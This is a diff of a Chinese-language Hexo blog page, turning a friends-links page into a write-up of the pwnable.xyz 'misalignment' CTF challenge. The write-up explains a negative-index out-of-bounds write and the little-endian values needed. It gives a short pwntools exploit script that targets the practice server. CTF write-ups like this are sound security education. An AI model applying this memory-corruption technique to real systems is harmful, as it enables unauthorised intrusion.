@@ -3,30 +3,35 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
   
-  <title>friends - thatshaman&#39;s site</title>
+  <title>pwnable.xyz misalignment WriteUp - thatshaman&#39;s site</title>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
   
 
   <link rel="shortcut icon" href="/home.png" type="image/png">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="friends">
-<meta property="og:url" content="http://shiroinu.top/PY.html">
+  <meta name="description" content="pwnable.xyz 上的misalignment的WriteUp。">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.xyz misalignment WriteUp">
+<meta property="og:url" content="http://shiroinu.top/2019/09/12/misaligment/index.html">
 <meta property="og:site_name" content="thatshaman&#39;s site">
+<meta property="og:description" content="pwnable.xyz 上的misalignment的WriteUp。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://i2.tiimg.com/696456/dff885aca477af78.jpg">
-<meta property="og:updated_time" content="2019-08-07T14:57:49.285Z">
+<meta property="og:image" content="https://i.loli.net/2019/09/12/N7duFq2lIhxyGz8.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/12/6mIfwGd7FOVAqYx.png">
+<meta property="og:updated_time" content="2019-09-12T11:25:22.167Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="friends">
-<meta name="twitter:image" content="http://i2.tiimg.com/696456/dff885aca477af78.jpg">
+<meta name="twitter:title" content="pwnable.xyz misalignment WriteUp">
+<meta name="twitter:description" content="pwnable.xyz 上的misalignment的WriteUp。">
+<meta name="twitter:image" content="https://i.loli.net/2019/09/12/N7duFq2lIhxyGz8.png">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
    
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1568295485395">
+  <link rel="stylesheet" href="/css/style.css?v=1568295485468">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -151,58 +156,49 @@
               <i class="mdui-icon material-icons">menu</i>
             </a>
           </div>
-        <style>
-  article ul {
-    list-style-type: none;
-    padding: 0;
-    display: flex;
-    flex-direction: row;
-    flex-wrap: wrap;
-    margin: -5px;
-  }
-  article ul li {
-    transition: all .03s;
-    width: calc(12.5% - 10px);
-    margin: 5px;
-    border-radius: 4px;
-    border: 1px solid #eee;
-    font-size: 0;
-    overflow: hidden;
-  }
-  article ul li > a::after {
-    font-size: 13px;
-    color: #606266;
-    -webkit-transition: none;
-    transition: none;
-    content: attr(title);
-    display: block;
-    position: relative;
-    width: 100%;
-    border: none;
-    padding: 3px 10px 5px 10px;
-    margin-top: -2px;
-    text-align: center;
-    overflow: hidden;
-    text-overflow: ellipsis;
-    white-space: nowrap;
-  }
-  article ul li img {
-    width: 100%;
-    border-radius: 0;
-    border: none;
-  }
-  @media screen and (max-width: 768px) {
-    article ul li {
-      width: calc(33.3333333333% - 10px);
-    }
-}
-</style>
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+            <img src="/images/back1.png">
+        
+        <h1>pwnable.xyz misalignment WriteUp</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2019年09月12日</a>
+    <a><i class="nexmoefont icon-areachart"></i>219 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
+    
+    
+      <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
+    
+  </div>
+  <article>
+    <p>pwnable.xyz 上的misalignment的WriteUp。</p>
+<a id="more"></a>
 
-<div class="nexmoe-post">
-  <article class="nexmoe-py">
-    <ul>
-<li><a href="https://wood1314.github.io/" title="木头的小木屋" target="_blank" rel="noopener"><img src="http://i2.tiimg.com/696456/dff885aca477af78.jpg" alt="木头的小木屋"></a></li>
-</ul>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/N7duFq2lIhxyGz8.png" alt="MarkDown"></p>
+<p>目标很明确，使v5+7 == 0xB000000B5即可获得flag。</p>
+<p><em>注意</em></p>
+<ol>
+<li><p>v6/v7/v8 是int64，占8字节，因此通过每次输入v8只能控制 <code>v5 - v5+7</code>  ,<code>v5+8 - v5+15</code>这两个范围的内容中的一个，因此需要分两次输入。</p>
+</li>
+<li><p>因为是小端序，因此从v5 + 7一直到 v5 + 14 中的值应该按次序为0xB5,0x00,0x00,0x00,0x0B,0x00,0x00,0x00.</p>
+</li>
+</ol>
+<p>由此可得，第一次v8 = -6时，v6+v7应该 = 0xB500000000000000 特别地，因为刚好8字节，符号位又为1，因此输入的值应该为<code>-5404319552844595200</code>（从计算器中可得）</p>
+<p><img src="https://i.loli.net/2019/09/12/6mIfwGd7FOVAqYx.png" alt="MarkDown"></p>
+<p>同理，第二次v8 = -5 ，输入的值就是0x0B000000 = 184549376</p>
+<p>运行脚本即可得flag。</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
+context.log_level = &#39;DEBUG&#39;
+#sh = process(&#39;./challenge&#39;)
+sh = remote(&#39;svc.pwnable.xyz&#39;,30003)
+#sh.recv()
+#gdb.attach(sh)
+
+sh.sendline(&#39;-5404319552844595200 0 -6&#39;)
+sh.sendline(&#39;184549376 0 -5&#39;)
+sh.interactive()</code></pre>
 
   </article>
   <section class="nexmoe-comment">
